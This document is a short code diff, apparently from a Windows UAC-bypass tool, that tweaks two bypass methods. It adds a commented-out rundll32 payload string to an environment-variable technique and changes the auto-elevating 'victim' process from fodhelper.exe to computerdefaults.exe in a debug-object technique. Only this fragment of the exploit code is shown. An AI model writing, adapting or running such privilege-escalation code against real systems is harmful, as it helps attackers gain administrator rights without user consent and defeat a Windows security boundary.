@@ -145,6 +145,8 @@ NTSTATUS ucmDiskCleanupEnvironmentVariable(
         //
         // Add quotes.
         //
+
+        //lpszPayload = L"C:\Windows\System32\rundll32.exe ";
         szEnvVariable[0] = L'\"';
         szEnvVariable[1] = 0;
         _strncpy(&szEnvVariable[1], MAX_PATH, lpszPayload, MAX_PATH);
@@ -508,9 +510,10 @@ NTSTATUS ucmDebugObjectMethod(
         //
         // Spawn elevated victim under debug.
         //
+        wchar_t prog[] = L"computerdefaults.exe";
 
         _strcpy(szProcess, g_ctx->szSystemDirectory);
-        _strcat(szProcess, L"fodhelper.exe");
+        _strcat(szProcess, prog);
         RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
         RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));
 
